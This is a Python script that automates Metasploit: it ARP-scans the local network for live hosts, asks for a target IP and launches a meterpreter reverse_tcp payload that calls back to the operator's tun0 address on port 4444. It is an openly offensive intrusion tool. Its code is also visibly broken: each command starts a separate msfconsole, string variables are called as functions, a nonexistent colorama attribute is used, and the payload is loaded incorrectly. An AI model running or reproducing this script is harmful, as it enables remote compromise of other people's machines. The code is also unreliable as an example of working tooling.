import colorama
import subprocess
from subprocess import Popen, PIPE


def run_msf_cmd(cmd):
    msf_console = "msfconsole"
    proc = Popen([msf_console], stdin=PIPE, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    proc.stdin.write(cmd + "\n")
    proc.stdin.close()
    output, error = proc.communicate()
    return output, error

def load_modules(modules):
    for module in modules:
        load_cmd = f"use {module}\n"
        run_msf_cmd(load_cmd)

def set_options(options):
    for option in options:
        set_cmd = f"set {option[0]} {option[1]}\n"
        run_msf_cmd(set_cmd)

def exploit():
    exploit_cmd = "exploit\n"
    run_msf_cmd(exploit_cmd)


print_line = colorama.Style.BRIGHT + colorama.Fore.GREEN + "[+] " + colorama.Style.RESET + "\033[1m"
print_status = colorama.Style.BRIGHT + colorama.Fore.YELLOW + "[*] " + colorama.Style.RESET + "\033[1m"
print_hosts = colorama.Style.BRIGHT + colorama.Fore.CYAN + "[*] Hosts: \033[1m"
print_error = colorama.Style.BRIGHT + colorama.Fore.RED + "[!] " + colorama.Style.RESET + "\033[1m"

load_modules(["auxiliary/scanner/discovery/arp_scanner", "exploit/multi/handler"])
output, error = run_msf_cmd("set RHOSTS \n")
output, error = run_msf_cmd("run\n")

hosts_list = []
for line in output.split("\n"):
    if "Address" in line and "State" in line:
        ip, state = line.split(" ")[-2:]
        if "up" in state:
            hosts_list.append(ip)

if len(hosts_list) > 0:
    print_hosts += ", ".join(hosts_list)
    print_hosts += "\033[1m"
    print(hosts_list)
    print_status("Select a target IP to attack:")
    target_ip = input()

    load_modules(["linux/x86/meterpreter/reverse_tcp"])
    set_options([("LHOST", "tun0"), ("LPORT", "4444"), ("RHOST", target_ip)])
    exploit()

else:
    print_error("No hosts found. Exiting...")


subprocess.call(["killall", "msfconsole"])